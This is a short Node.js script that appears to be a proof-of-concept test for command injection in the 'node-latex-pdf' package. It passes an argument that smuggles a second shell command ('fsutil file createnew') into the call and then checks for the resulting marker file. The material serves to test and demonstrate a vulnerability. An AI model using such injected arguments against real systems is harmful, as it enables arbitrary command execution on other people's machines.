Reflect.getPrototypeOf = () => false;
const a = require('node-latex-pdf');
const fs = require('fs');
const path = './node-latex-pdf';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
a('./', ' & fsutil file createnew node-latex-pdf 0 &', function () {
    file_exist = fs.existsSync(path);
    console.log('{ ' + file_exist + ', ' + true + ' }');
    fs.unlinkSync(path);
});